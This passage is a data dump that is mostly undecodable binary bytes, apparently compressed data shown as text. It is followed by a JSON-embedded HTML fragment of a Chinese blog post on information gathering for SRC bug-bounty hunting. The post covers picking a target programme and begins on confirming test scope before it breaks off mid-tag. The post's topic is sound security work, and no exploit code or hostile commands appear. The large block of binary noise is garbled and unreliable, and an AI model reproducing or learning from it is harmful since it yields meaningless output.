�ۏ\r�s�2�I���|��8|�`��\u000e�\u001e���\u000b\u0005\u0001\u0015��GO\u0013;\u0011RS��d#�\u0010@\u0015�A��J���\t����\bSb]�o2J\u0004\"R\u0000�X�\u0010\r��..�`�l���&�\u001e�.$>O�#5��@z[N�*}��t\u0000�L�z¨�]`���݂�e�?eM�8ժ\"�%H\u0003*�e0A��VR))\u0001�\u0014\u0007c��]�\u000e�;\u001b\b��Ig��N\"�����f��G��\u00155Xa�\u001cA\"+X\u0017C�\u0003;]��\u000fF#�\u001a\u001b�\u0010\u001b`\u0005_��\u0018�F��+N@:5��\u0015�;\fewdZ(�Y\b�jT5�\u0012��h#,TQ��u�\b�ނ�i��}\\U���6»��\u0000�<��LKs�M�V�ek?�\u0011L-Z�.��\u0001�BVѨ�\u0002\u001c\u001c�\u001a�]\u0011�e\u0000{\u0017T\u000e\u0019B�~�v.T`�\f\u0015ID0�MS���ܟ�`^��Ǐ�ݹ \u0016\u0019���^`@w�}%c�E{\u0017:\u0010֣D�9���Ԁ��^\u001f����.[�<���c\u0011=\u0006a �\"_��Ю��E�q���\u0001\"69zO\u0014�H[���w=���o?�\u0013\u0018&�Rr:Zzo�\u0010Z\u000b�3�d/t� �/ȭ(r5�ZM�\"N)K��Q\u0016\u0013�\u0014E%:�&�t�^;���Һ���#\"�U�-^��ęR��w����\u001bHҫ`�\t݁�R�\u001d�\b�W��\u0007��__��Z����ۯ��-T`\u0014�\u001d�}\u0000�TYٷ��\n\u0006t3�լ��Sr��\u0015���eB\u0002|>�P��R�M�Kc��\u0004u��uI\u001bE2���\u001f�\u0001\u0007_R�3\u0017�\u0017�\b������}�X)��Ƃ���;�\u001f�����\u0005��ΘՌ�\u0012�@\u0018l�/\u001dF0l!���\u0019ʲ)a���\u0006�>��l\t\u0003Qa��T����R~�?=�mՌ����\u000f�1E\b��6\u001c�\n\u0016˒��24g��bWF�����2\u0007\u0003��[\u0012\u000e�R�NO�/V�Y?�n�'������bZ\u0002zF\u001e6���|E�z'�k�3��pPߊ��o\u0006o�u�g�\u0002[\u0016��Cx\u0011�<\u0013l\u0019�E0��\u000eۤH�z{�\"�_;�\u0013o\u0018��i@\\�#���������\u0001?�:�Y��!�Xh\u0002iq�\u000bo!��)�b�u��W@tZu\"y�\u001d��#R'=���S�\u0019���XgV}��{��AwF)�.)�c�6�\r�\u0014�|96WY>\u0019�{\u0006�\t���|�Ȳ�\b{�F��V��\u0013�sr�\u0013]��3F>�E�\r�t�\u001c�\"�>\\�����#ʽX\u001f�4�ZPG�wN\u001f)\u0012|�\u0006y��\u000e+�%>\u0002h_�\u000f�&��Mɥ\u001a���<\u001a j��\u0000tA���ܵ\u001a?�\u0016#D\u001c��\u0015����\u0007�\b�T\u000e�E\u0016�@Ƨ]Rļ�ZT�!gQ��X\u0000���\"��\u001d]��Jغ����������i��\u0000 �\u0016ڂ��\b�4��7��\u001fb�����\u001d�()Þr*I�93�1��x�sf�\n��'�l���\\=�\u0011\u0002(�\u0018���\u0013���Y+�\bL޹8$�\u001c����$�����=\u001c���\u0002���^y�;����Õ�|Y��*Ѧ��{�k���%�z��\u0012�\u000bWBJ��\u001d�:�ǲ\u001b{�gd��~�0���^��y�j�\u001f��@_a�>^�`�n��9��n>iq����\r�\r\bv\u000b��\n�`��D��K�i-�7�\u0005F��\u000e!xk��2\u0003�/?��ߪ�\\\t�_�%�x���]����ĵ~\u0016��\u001eS�\u0011Uy\u001ee\u000eT�\u0015��j�P����\u0007%OI�T�+f����\u000f-�\u0016���>���\u0013�C��c��2���� 3��ٖ���維\u001a�tBG>�\u0010 �h=ޝr����V36�b�MM�J�'�����*s����=��۷�|�Ɠ���K\u0019�i�\u001b1-�;=�W�H)\u001ep�\u0015��l�-�P?O�݊?UAf����h\u001c]3klG��\u0011�\u0014-�l��\\*�$�������\u0006h\u0014s7�@�B�7���?�i�\u0017-F�T�\u0005|�5�X�����ݺ��\f��~2�\u0015\u0010�\u0007\u0018�]�g�Ӕ;�=ŏ���\u00149Ɇ�ޞ8J\u000b��oC�6�uv蝣5�7��T�����]��\u0015q7�� J7n앻\u0015�(�Z�Sیڳ������\u0015����\t�\u0011��l�6R��0���vI@x\u001d��\tpn�~�m\u0006Zh9�A\u000b�/�U-\f����pD����2�%�\u001f(O5���\u0014\u001eJm�?�\u001a8H�\u0001�1X\u0019��\u000f9i�:��\u0000\u0000޿��V�٭�E�X\"�._ֈ��t��4ѓ�r��쥎\u0005,�q\u0017��J��\u001b��).�F���-��a3\u000b\u0019\u001e�\u000f���8G«\u001b\f�6~Mcm}P\u0016a�\f��~\u0019fDK�*��и�G���zC|&\"������\u0007\u0017\u001c\n���\u000f=\u0005�jJW\\\u000e��~�ܮ\\�\u000fb�*�8\t�xyWm�y �\u0001�X�ȭ��i[\u000b��^\u0012h\u0004�w��\\\u0016�\u001ae���\u0019�\t��\u0013\u000e��X12��\b�\u0017�n:�9^��S��)�*zN\u0014*=�\u0003 �\u0003\u0005h)��z�& �u\u000f'4 �\b\b|Gw���\u0003��ʝ\u001c����<͸k\u001e�\u0004���\r�\f��s=�e\u0013Ä�Q�\u0015�ɚ��L��\u001e[*)�:j�\r3���T\u0010�?hE�\u001d\u0016q\u0019,\r\u001b)��\t�ˠ�.\u0000�\u000fl��<sh��G�Ӌ�\u001e\u0004�\u0005�zS\u000e\r^�AS�y\u000eJ-�\u0010�����`Q{�1�}\u0011\t��kه�`��dp�\u0015R'z+4\"y5��p\u001d؋�<Z�-Yij�l�����l�X\u001d��\\\u0000�h\u0016l\u0000�29��\u0005?\u0012\tb��T�|_�߆\u0003Di�\u0017��.�$*�\u0002/Lw��[�H��`�����m,�>x)�z�INeJ��J��Vdn$\u0017\u0000\nK4Hf�$�pؕ\u0017}i�S��n\u0006i�DЕ\u001d\u0015W\u0001�n~\u0017P$�AE4�yz\u0018\u0015�g�8��c�x��}�~HFE]\u000fٙ����\u0001c��\u001f��\u0005O@G��}� 6�\b�B�\u000b��_�D�K��<��Ķ�\u001f��>s�'�@�.����\u0016�ؗA����u�/�QZZmb�9ʲ\r�1_5A\t\u0011�R\u001c�\u0005@�LID��T\u0019�\r���)f*�/[\f%\u0001D�#�C��\"\u000eXE�v\r^G\u0007�\u0019�\u0007:Y%y��?\u0016�����\u000f�\u0019��h)��n�J�\u001dQ\u0011���y&Mmr*\u0001fS��\u0019\"\r�\"xb��y@gtp�pu�\u0019��&F疲�\fQF!�\f.\u0000j�r���5\u001b�`~��j7ɀ��7�U����W�oK\u0016�N��6\u001a�\u001fz��j��:�Ϡ�?g����kނ����\f�zhG��ڇ�lb��=�1�T�]��\u0017*����;�\n�d#�\u0000��v�\u000e\u001d'��U�JB:d��9\u001cx��W�)�6Z/j\u0017֦j��\u000e\f\u001e�<Z�\u001e��A�\u0013�I\u0001�[�\t&�X#S$�b�A�\u0007��_�\"����\u000e\u0004���\u0016���a�y�<#���\u001frlI\u0012��K�YUS\u0017\u0006��ix}��x�k�\u000e5'M\u000b�\n\u0018�D��x��u�\tt���5\u000e�\u0005��h�\u0013C�:fr�+$*I`�{[6!��D�+6@���+`Y�`s�8�\\�y�\u0011���/ۊ\u0001�����v����Ʃ\u001c\u0013Ÿw�_�m\u0013O\u001e��3G\u000e{�l\f�C_\fi\u0004B�os\u0002hB�_���\r���������R�s\tD\u001c�����} ����8 ��:�̗q[�R�7��}\u0017\u0001��~`�m\u0013\u001c�B�\u0012`,\u0001�����\u0015_��\u0016f�����a8(\u0013\u0018�����7�r�\r\u0003�M��\u000fO���Q�Z=C���a��MJs�D-u�i ���գ�(�1pf���\u001d�Z\u000fi��E�G8�^.\u0011�\u0010�.-���\f�\u0006��\b�G(\t�\u001e�����Aڥ���Qw5.��\f57��Vu\n<�؆�H緈�\u0000]���\"\u0002�}m��\u0004\f9���F�?�;3�����\u0013\u0019%�u��q\u001c\u0002�:\u0000-A����CWl��L�\u0015��\u0001�d�~�R<�!�D�͞\u000ft�b�[5�jp�)�@-�^6Y�#5(��ߐu�Ʒ�3h�\u0013�O�L�ǃ\nzO.�m�������ren�5����i��60��n�[=\u0000����{�b��jH`M���\u000blFDݓwE���UG�zG�mp�\u001e���i$܌� \u0000��}!�>�\r\u0014�\u0011�\u001a����?�\u0018N{����Y\u0017���U}@�� u=Y�����q��\"�(�SC&\u0011:�n����$D�W\u0019@`�\u000b�Bٔb��\u001b�\u0015q����\u0015����Y��3��*\u000f�Pٍ\u001bY�\u0003�{\u0005�$��:�j\u001f�\\�\u000bnY\u001b��<���Y�\u001a��4����H���2ᔤ�go�d#�y�+��L.M\rp�Ԇm0��%'+������D}�t�M�\u0000����1\u0007]z���\u000e^25\u0016^\u0018���\u001b;dW�!Kh�����_�d�<��ǔj�����f�[\rakI7�hy\f�7�>B�\u0011�V|m\u0003�Ɂ[aa���[�.�\u0018Z�*��ě�\u0003���C�\u001f��<�ڰK�o�(�\r=�x���v-B\u0002�|�C\u001f\u0015�\u0007!\u0007�4l�\b\u0003�B#��5���Q��Y��\u0002Y㨂�\nY9��0\u0019x���T�G\u0017\n\u0006g\u0002����v���9��Ԗj�a\u0004ˣ1ѼGN���21�IL�\u0019�]\u000e\u0015\u0005���R����\u0013n=i�2�\u001fY0'���!�R]���O��$1'V_hm�a(���� �\u0000�\u001d�X�\u0006��cZ��8��o\u0019o\u0017�9�X\u001f�|MFc\u000f+Y6���G�[�.���:�[^-0��\u0010�zzSӾ����\u0003\u001c?�z�\u0000\u0015������\n��|��冉v\u0003���r��z�4�=<�o@��{ͦ� \u0016\u0004l�\u0017�'%�Lp��Ui���\u0005z�z��&�V\u0013�k{�%�^���G�,���\u001dc`�\u0017T r{nv'|{pw\r���\"4W�\u0018�>��Dr�YN.����r�D޿���]2b�J��'��;�x��\u001eK�'��\u000f\u0001�XU}\u0007����\r�D\u001a���Z0���(jؙ��Xz9\u0001邯ܯy(�Z\u0019VBK�%�8\fҐ\u0006WO\u0016t���A�Ae\u0018�&EMjN��G��o���_�\u0010,���}�4�\u0004D��V� ��\u001c\u0013 ���\n���\u0005�?G�t\b2Ia�6@`Wyfն����r�\u000f�J�\r��!��A�4��(�~Xs��t\u0019ֱ\u0013\r�qw#)i�\u0011�U^i�]�q\u0003\u0019��ǃp���\u001d�Ě��c��i�\"��\r|0�d���'�퓅$\u0007I�]��$\\\f\b~�i�Q���_E�+B���G��0��]smj8ۄ��S�`�#�/���K�Rm�\u0006ѻ\u000e\u001c\u0007o�aQs��H�\"_)��h\u001b�S��\r��Y������c-voK����\u000f��2�7�7\u0004���%���\u0007�l�G'�w��\u001f�C�\u001fa��柝��\u0004\u0015��\u0015�8��\u0018*]�\b��昮����siN�\u0012�c�d��vb���&� \u0004�6\u001f\u001a���,ɑʓ�b��`d��8y��̲8UT�й*��\u0019\u0003�k�w����ԇ�*[\u0006}w�\u000b}��\u0019�\u0014��\u0007\f�\u000b-�\u000fE~{�fV/�+�]k9.\u0005kW�\u0005�\u0018̓�!P�\u0006���\u000b�J�\u0014�\u001f1��\"B��{z���\u0016;s{��i�g\u0003\u0003���e\u0011�ُ����\u0003)�~���ө4���kg�Yh]��p\\\b �(��J�����>\u000eƷ�N6͠�M�V�q\u0011����=Z\u0005! \u0002�Mh�*\u0006i�� �>�d����\b���$�\u0017\u000bǐ�������v���0\u0001e-\b����P�\u0012���Z�\u000e�b\u000e��RJ�^\u0004�\u0018-f��b\u0015\\\u0002���:$�/L�\u001d��îmA�0��%X�\u001d\u0000�_\u001fGP�d\u0019\u0007\u000f�\u000f�Z\u0014׬'\u0017=�j���g��=�W.�\f\u0011<�RZWp!�\r`��AÎ��i\u0000f��\u0006��|�9�v�;�BvH�\b���GӼ���.C��\r�]y�\u0010�-\u000e�۞-<cg&�©7 J,�\u0010r\u0015F���\u001d��^�����+\u000eT�<��'�Yh\u0010\u0016D����\u0003�&̋һ���\u000eXX\"�^\u0018��~{\f`\u0005��;\u0019�\u0007\\�\u000f�\ra�e%��#cX[]�*�W��=�\f�\u0016�\u0010�7�~\u0005+�Ê�\u0001�1�EHBc\r3ğ\fL\u000f\t\u0015��gF\u001d�\u0015\u0011�\u0016��v5�-\u000f5��%+�Mt7���A=�:�oe�L�r:nh��P9���@@\u0005M�\u0013-�*f�\u001cU�\u0005�k�\u001e�]����>'S�\"�\u0012ފ){O��ҳ�\u0019��ֲ�g�\u0016ҡ��\u0019���Гۅ�\u0004�\u0006�\u000f�dd�\u0012\u0004~�t�4P\u0010\u0006��\u0017-u��ŰQ��f0u�\u0004�[�֪�o<\u000f���N7�[\u000bJH\u00078\u0013��\u0014�\\'��\u001f8\u0011N������0�\"\u001d?t\u001d�\u001d�*�@,Q�I�\nb�ج't�z�0��p��wM(x�Th��\u0001~\u0001���U\r\u001f\u0007Cr�\u0006\u001e�\u0000q��w)D\u0019ۑ\u0003�F�t��B\u0007[�HAʫ\u0015ٽ\t(͝������31��fkUx�5UJ��R$\u0011҄~k\u001c�и�s\u001d���V�\u0016��\n\\\"*�7C9���)����\u0012�n\u001f\u0000r\u0007ͫ\u001c;1�W\u0012feV;�\u0013��D��l��2��nY\u0014S\\\u001a=�@�USu2�h�6\u0018���Sed��ꬡ<$\u0002&�H�?v�w^z�\u0002\u000f1��v\\��\u0006Y�}٢��;Gp\u0000o�Ho.���<B�o!x�L���\b��\u0015�(4_ߏ\u001e���p����~\u0013Q\u00141\f2�F�ɹ�Pa7\u000bq\t�\u0017滽\u0004+!_W{T�D�B��r\u0002�0\u0018˙��k�Y�)WD�[��`�#7� �ՊB?si��\u000f��<oqC#�\"\u0013 ��Q�`���\u0007\n�R���w%��:\u000b���G��2\u0011�%��B�fC\t�8v\n\\�⢐)vN���:��\u0011r�$���\u0003��3�����r�\u000b\u0005&܆��C�\u0015�<d�~\nt�Z�m���W��R4�~\u0015�\u0002&8mY�ε:��v�5\u0007���L���F�\u0013LS0�&VK\u0014�vb���s+hU��SI�y�'���ӫ'�\r�����Ȟ'P&}\n��p�����!�\"���\u0002\u001b���z%��\n�\fC&�\u0010엦#\u0002�W��Ίʾ\u0001GB�y(��if�&����r�ܠ<Qj\u0018�\u0014`��^~�w5mIu�7��'��r��\u0011M����bk��7 �Sn�\u0018D�:�����[J�i�c,U;p\u0019����@�g�%ug�[\u001b���{57n&��\u0007�r5�\u0003e�>L����B\u0013���P�(�\u0017�\bH�ӛn_\u0017}\u0002ƹ,(���iʸ�a��V�ҝ�H\u001b\u001b���b�׉[�6�~3�\u0003�\u0001��\r�<\u001e�\u001f��_���i���\u0002<��&oRV��t��Sx\u001ag\u0014xQ#��׌e��%\u000bu�\u001e��]�e�(�\u0019���Q��|Xm��\u0006���|\nl<�p`\u001d4W|\u0001\u001aw��Q�Ȗ��ѧ؂�5lz�r\u001b\u0003lu���&�G�'�9<Z��bt2��o�F��D<J��^?\u0001�\u0018��L��\u0013�\u0002�v�bC=\u000eN�^\u0014G��K/xd�*qWO\u0011\u000f2�\u0013\u000f��~M*�0x�\u0004f�\u000e+03��7�5\u0010M]\u0000�;�Lʲ/|����\n�K+�ه�+铫\\�/I�'#�\rOK\u0011�\u0003\u000b��M\n��\b+�>\u0018\u0015��7�\u000e(�u�����_\u0003��;�齱��\u0019��e\u0015\u001b2�lg�:�#���\u0013>�1GL�}'�tI:@=\u0019�\u001f��i\u0002�s\u0001Q鬋����C\f2��B�\"OJ\u0012G\u0014F�6��2�gM\r��ŀ��LO5�H�DI��Ԕ\u0017%m'N�*3vt���vl\u00121�\u000fR�Zl��t���s7\\�dK�\u0016\u0014f?tZ�r�@���+=p�N���R\u0002�+?����F-�\u000bD\u001b,�ua\u001b��c9y�h!�\u0016x.�ޞ��\u001fC�����n�yJq��`�\u0015��]\u0017� \u001e��6�\u0016������!��l%qp9bo�\r�)�\u0005���n�+c�x���\u0006U\n\u0005r{�0�I�\fd��\u000f�Q�R1�\u0017��_�F�d��kˀ:B���/^|\u0013�cz\u0018u��q}�v27�5��u\u0019\u000eܻ���.����o�ln��+7�9��u��\\b�j�Ş���R1ܔM��F�,>\u000fM~B`O��s��\u001c\u001b2�[��7���b��c��\u0018��ԍ;��S[�'n�\t�9�X�\u0017��T�]�\u0001��kDl�y�����u��P��᝽\\9\u0013�[���ͅ/�G�:�A�\u0019~n�H����>Onb�ÌIWY˦2)\u001aZ��n�d�\u000e�M\u00042y[\b���&[\u00193�!j��\u001c�B����:KU�i\u0002���ޑ���\fUW�9�a\u0013�*��ȯ1_��\u000f`!]yG�8�*n�l��M���@��ңe����H{�#[(���&��l��D�U\u001b��ݜQp\rgѨ')6E�T#Z�\u0003\u0010�l\u001d�\n\u0013}ꃵ\u001d���\u000e{���c)%\u0000��\n�[�\u0002[Y��F`�-�\\b_\u0003�7��~\u0012YH�\u0004�P�p�\u001dK\u0003�R+�6yfe�,�O�{��\"��ݚRKX���o\u000f�8���t�\u001f\u0012']\u0016�FtOl�0��\b����\b u�dvqV��G���Oē�E_\u0007_mLʝp�q\\���=гB�&M�3հ���&�M��3sR�ܻ�U�ud/g\n��\u0007{\u0018\u001a�̐�C6bߎ�oc���RJ�C�-\t�\u0002\u0014��K�.qF���&\t���r~�0w\u0017B���\u0018^;\u001b�\u0006kWn!��_�H�xh�7\u001b�I4�$6����׽���T\u0013͞Ҷd\u001e��>V���򷌸��\u001c�{pUac���\u001b����I�\u001b\u001fr~�3�]m���1��\fCRs}\u0011?2��cy_w�\u0005�,��u��C�,����\u0005�ؤ��!���Ckv`�\u000er���w�V����Ӵ\u001dɧ��v���������\f6�O�w�ɣf�\u0014��\u0012\u0011Frc�3W�ݑx�))Q�a��@_:\u0013�c�7%��\fF\u0004<9��<\u001d\u001d�TF\u0010|�\u0014��\u0010�*�iv\u0004f�q�>#N�\u00045@ۣ1��\u000fdw~5�R���>�T�\u001f�\r\u0004-���Z�tܓ�]�\u0018�\u0001��\u001f��\"�<\u0018u�펒KZ2g�\u0015?S`���\u0017N��dT�0?Ŝ��5\u0000}g`�VĮ�B�f�m~��\"l\b\u0015�\b�Z���z\u001f���9K\u0013\u00023ʭ*�CO}�Tl��r�P�2���\u001e\u0005vr�@����굗9���\bI�\u001fQ/���B����9���\u0013T@�H\u000eQ\u000e=�!�)�fL\u0005T���U\u0003Y�Z]�\u0010��/\u001a���df�m�-f���\u0007X\u0005*�27\u0005�b׏�l\nUӛ\u0012Y�e�#���2\b>�\u0018\u0006���ւ9X�.\u0002�m�\u0005e\u0007�\u001a]����\u0016hQ�\u000e�����Y��\u000e�\f��q��\\�vX�yI�R���2{b*�N����\u00051�ې��%��\u00045���N\u0007u��\u0012|��o)�wkQ¤�:�\u001f�\u0014f)4�|��XG'����TC��7�8/��FfۏFU�\u001a\u000fHA��c�R\u0002֓\u001b�$�\u001dx�;6�\u0011��=e\u001b\n��O�*�\u001a�C�Yr���~�1x���pA\r�\u0018��|(N�;\u0013m]ƟOWg�u���\u0014��נ�a_��O\u0012�\u000f�M\u0010����P��L�9w�\u0001���e����HA2{�}\r\u0013��|'\u0000Ij���~\t\u0000�\"�w\u0018v�%� ������J�ρՀ�E]o��:Gf�����1���H:�9��G\b�����@��|ڤE5�cM�\f���l��u���\u0015t�\u000f�ù���Nܒ�e��_��\u0017�\u0005�\u0001M��m�>+�mBD�W��u`\n⛢&�ٷ�B|۸��\u0015�\u0006{m��y\u0002ꡔ\u0019�?B��{���>�O\u000b\u001c��3X�d��#u\r�\u0014�]�&\u0016E���b�^�l���\":���\u000b��\tٞ,�!��m�X\u001d�.}X�\u000eK'3w�x�\u0018'EˡG�T���ޘ���7����%d/�9�uw�C���\u001a���\u0002�7ͷǔٽY�@>�Y��v\u001e�\u0005�\u0005��f�����Ko\u001e=\u0007T�b'���\u001d��\u0000,ޖ��Ҝ��$�g�!w������q0c�ñ�jE�Q��i��ú�\u0003}eyi|�O!B2�k\u0007���jX\b\u000e�<�\u000eG?giV\u001c���5�d>݈-'��hu�_�������,�\\��fg�;�[�NDl\u0001�V�S��*��I\n\u00114Z��������?_�dp�>�P�\u0011�3��v\u000fV\n�^\u0016$���k����i�to�d\u0014����m'8�\n\u0006��h\u0015�A\u001f\b���>�\u0006{�\u0019b\u0007�XA��18��#���M3:�>'�4 Gi�f!׽��Lu�I���U3sT�BM\u0007�\u0015�K��\u0006\tp�&�\u0002\bX�ĵ|w�+��<�)Πh)V\u001aݝ(IS�-�3qu�V+�h^��&@��۷\u0001N�&.?�-Y=޾\r$��\r\u001c�R\u001c�>j�� `�$��*��\u001c�ߞv���9Ip��rx���צ�j�+�Bx\u0016қ\u0012ea�]\u001a,���N�uȂ\u0004�艙�q����\tK\u001b9�v��v(��\u0002��?ш?\u0017./�u(\u0016:!��\b\u001f}\u0015#z��,Dm6\u001c��J�/\u0018�Y�h�\u001f\u0000I+ħ\u001brO-{6�jxn�\u0006H�\u001fmz���|\r\u001dɃy�\u001c\u0013��mf�����8\u000fjS�\u001efZ��#vsC$\f�ݑ�#�\u000b\u0000��j�V�\"�j܄/�[�m��B\u0017���\u0007.�\u0000\u001e�7�O�\f\u0018Q\u0011Nh�9\u000f�{(g�;P�a\u001d�\u0014�C�oc�\u001c��s\u00021\u001f2��\u0019��5���;=�&��N�����S\u000e�\u0015ҿ[\t�\u0011��㊚I\t��w�˙;�}R�)�\"h2���f�\u001dw�<M�B� �~ޫF�\u000f�|���t�0����\u000f�_�.��/\b�����a\u0005��J:��L�'��~�%�@�M\u001dG��Q��\u0012��V�o�p:W=�o!���~3�\t�� BVnG\u0004؅�nk1/-���,!��S\u001f'\"λ\u0019u���u\noXr\\�\u000ej���E�w��OO�\u0005�ܤ�#Z��B�,��i\f�F>�B\\\r�� ���D\u0003��`�Ҟ�hG��ѱ�\u00009F<��\u000f3\u0007��F��\\}�\u0015gF)�\u001c`�7�H�\u0006��9��L�3��ŷ���G��{�?�y\u001c*�jr����9K\u0010Q�\u0018zP��\u0018�2�(1e�c'�9�\u0011;�q,�%�q-�x��$�\u0013\u0014��w��\n^^��r\u0005��7n����ì�fO�o\n���3\u0005#>�\"$��6$�*�i[o\u0000�\u001f��ě@�3Ӛ��X�\u001eg����\u000e��!d���ً�D@t�� ,�Dl\b���AyԒb�p%�\u0002�ɑf`���\u001bL)\\Y�x06ج\rq�B�]\r�\u0014P-�:CIs�s-\u0016?]�>�I�K����\u0003){ۂ�Ʃs\u0016)�-�\u0014b�%��SX��\t�-c�\u0010\u000bt\u0005����\u0007���[\u0003\u0019FH�\u0017��\u0019��bYg!\r\t�\u0011\u0019>�\r��w�\\�g�\u0007O?�\u0003�+��\u0012U�I�M�\u000e\u0011���\u0013�f�\r{ڼN0G�2�\u000f���=�s�=r�\b\u0011#|���Z����\u0005/q��$\u0000W�1[��/�����ܙ��\f��e\u0018C/��J�?����\u0005����y�fσ\u0005M�^g�Y������\u001e�Z�6�:+�;5\u0013\f\t�&�6c��\u001ep{���pq<؎}H�l#�1��b��˅��p棼��\t3��\u00043���8�ZF�_�|��:1����ZL�?qMiqPx+�F�\u0001�[d��t墂��Hkv�N�&$��T\t\u001e��\u0007p`�W\u0015*O�o'�)��!έ�4��\bKX���m�sJ�`I�F��$�&p&W7\u001f�\u001cզ}�b������D�\u0015i5f��\u0007��;�I�6>�\u000e8���aX�(}[��x\u001f�Ӊ31\t\b��}\u0018\"*�S��2��\u00063\u0011�p\u0004��`#�\u000b\u0010�`\u001c�\u001d��e�\u001dQ����b��\u0015[��\u0017'Y�\u0015�ux\u00024�����g\u0005�����\u0005\u001d<�?\u0002��(��pc.\u0014�yt�Ԇ4g�\u001a/�:a���$��Y?F��%�1h�`�p�[�-wi�Iav/&�\u001a����\u001bXbj��ᠪ��y\u000f��q�E \u0019����н��\u000f� \u0004���~-\u0002l{���&\r�g��\u000b%��l\nKF�R\u0007�!_��c\u0011�\u0019�b���\u001dH\u0015͌C�t�V\u0003,z��1��\u001c鏮�m�X�ev\u0019D\u0014\u0019�V���U�&%���Wp,?�C�n(Qe\n\u0012Є�a��L2\u0003�X�\u0001r\u0012I�yD��A�\u0017�5�0��x3��\u000by�Y�hz\u0014Sk�:l�\u001eE���m��e5���\u0001\u0017��\u0019�����s�I���S\n5�TGg�2�##��ׂ\u001f宋ټ\u0019��\u0015,�\u0005�@7�\u0003��RΒ\u0019N8�D\u0004yJ�H�5�F�%�պV8,/�@�ț)�z�px?&ae&E\u0016\u0012��ͅN���%e���\u000b!��6���N�C.b�Q�t2\u0018�\u001d�|\"X*ȷ:Pk��3M\u0015\u00025A�po��\u0010� :�\u0011l�����r]�m��m�\u001e�Zb\u0006\u0014�[�䙛\u0003db�\u0014>\u0010�A��\u0018QT���.T`�f�6}��\nl\u000f�N�z\u0007'{���1o8=1�k[�\r3!�\u000b�jw4\u0005�H��#�e6�v�a\u0001��\u0012���Vr\b\u0011��ј^\u0013��\u0017\u001b���]�k\u0018���`��y�e��\u00072v�me��xb�\u0019�$���O�V9�\u000f\u00130z����L}Lm�rz\u0010�����\u0007PY\u001b��ފ��3���\u001füL%\u000b�h�rgr�\u0018:�Y�77\f�\u0012\"K��o\u000e#P�G*ZRA\u001b-H3���Ű!+Ar�lJ����UX�K|j�-嚸,��2��̴�ל\u0001[�\u0014Q��-\u0014\u000f9!��\u0014\u0014\u0014\u0001 ��i\u0019q׿\u0012(���'ʎU�ެ�+�\u001a�Lv\u0006�LNҶ\u000el\u0010���ñ?�Q�\u001c(��\\~\u000f\u001d����-��\u0019�B�䛲*�\u0010���e��\u000emʻ0��\u0003�m�=������l\u001f4\u0006c��S�'\u00160P�R���n<1�*�ǰ���⎔|�x���p�t�l���H]a�({SE��\u000f(�\u0016��/�(~�aW�OR(C�DM�F>)f�5\u001b�b\"e�����D�6/�\nk\u0000a\u001c�O�\u001dVΑ��W~\u0006\u0018�ፕ\f�\"𣵬�B��\rP2���Q�soh� IZg%qU���\u0005'H�\u0002E&���ȫB\bF���y\u001a'%�]6j���k��<\u001a\u0006�����9e���U�\u0017�;�~\b�͑G\u000f2�:t����1�^H�թ�3'���G������.��\u0007�,�\u0007��\u0019.\f��\u0005\u0004i�!џ8%[\u0003!9��q#ZhZE�M�]�Kf2s��Q!�]\u0006��xV�����%\u001bp�m�Bi �\u0015�\u0000�H\f iM�Z\u0005�9=�{�H`�\u001c\u0017߯R\"��\u001f���w�1�V��7A�T>��`\u0000�\u0001��jg�H\b�Jy�C'�]BM\u000b\t@�R8�C�?ёj�y�z��W7���.\u000f3��P��Տ�\u001f�\u0007F@-?\t���S�r\u0015]��{a��'w��D��<�k`V��e�ֶ*\u001d\u000e��d��\fY/��E��\u0002ǮX\u001b��吥җ\\\"�f�m�]\u00008��B\b\u001f�\u0001�wA�\u001cA�.\u001b�8.�\fp^\u0018��\f-\u0019�Pp��|ʴ���Oo�?��:�D\u0014\u0007=� �~\u0002QN�\u0000\u0000\u0000"}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>本文已发布到先知社区</p>\n<p>作者：ajie</p>\n</blockquote>\n<pre><code>说到信息收集，网上已经有许多文章进行描述了，那么从正常的子域名、端口、旁站、C段等进行信息收集的话，对于正常项目已经够用了，但是挖掘SRC的话，在诸多竞争对手的“帮助”下，大家收集到的信息都差不多，挖掘的漏洞也往往存在重复的情况。\n  那么现在我就想分享一下平时自己进行SRC挖掘过程中，主要是如何进行入手的。以下均为小弟拙见，大佬勿喷。\n</code></pre>\n<h2 id=\"0x01-确定目标\"><a href=\"#0x01-确定目标\" class=\"headerlink\" title=\"0x01 确定目标\"></a>0x01 确定目标</h2><p>个人是非常讨厌无目标随便打的，有没有自己对应的SRC应急响应平台不说，还往往会因为一开始没有挖掘到漏洞而随意放弃，这样往往不能挖掘到深层次的漏洞。挖到的大多数是大家都可以简单挖到的漏洞，存在大概率重复可能。所以在真的想要花点时间在SRC漏洞挖掘上的话，建议先选好目标。<br>    那么目标怎么选呢，考虑到收益回报与付出的比例来看，建议是从专属SRC入手，特别在一些活动中，可以获取比平时更高的收益。<br>微信搜一搜：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634919905280-6a3474d5-e288-40e0-be14-a11ca5a37bcb.png#clientId=u713ba10f-a757-4&from=paste&height=660&id=u8b4a879d&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1320&originWidth=1360&originalType=binary&ratio=1&size=333456&status=done&style=none&taskId=u74e51aee-8625-4c5e-b368-f880fa9654b&width=680\" alt=\"image.png\"><br>百度搜一搜：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634919958148-21279f08-65f5-45e2-93cc-37781713440c.png#clientId=u713ba10f-a757-4&from=paste&height=668&id=ubea7849e&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1336&originWidth=1784&originalType=binary&ratio=1&size=467822&status=done&style=none&taskId=u40ba20aa-3b6f-465a-b6ff-105b03a1cac&width=892\" alt=\"image.png\"><br>现在有活动的src已经浮现水面了，那么我们就可与从中选择自己感兴趣的SRC。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963068419-ddbf4fb7-605b-46a5-aa91-139da2bd03c9.png#clientId=u713ba10f-a757-4&from=paste&height=706&id=u4d43608b&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1412&originWidth=1726&originalType=binary&ratio=1&size=575771&status=done&style=none&taskId=u7150b32d-8964-4f4b-8100-3de307b4870&width=863\" alt=\"image.png\"></p>\n<h2 id=\"0x02-确认测试范围\"><a href=\"#0x02-确认测试范围\" class=\"headerlink\" title=\"0x02 确认测试范围\"></a>0x02 确认测试范围</h2><p>前面说到确定测什么SRC，那么下面就要通过一些方法，获取这个SRC的测试范围，以免测偏。</p>\n<h3 id=\"1、公众号\"><a href=\"#1、公众号\" class=\"headerlink\" 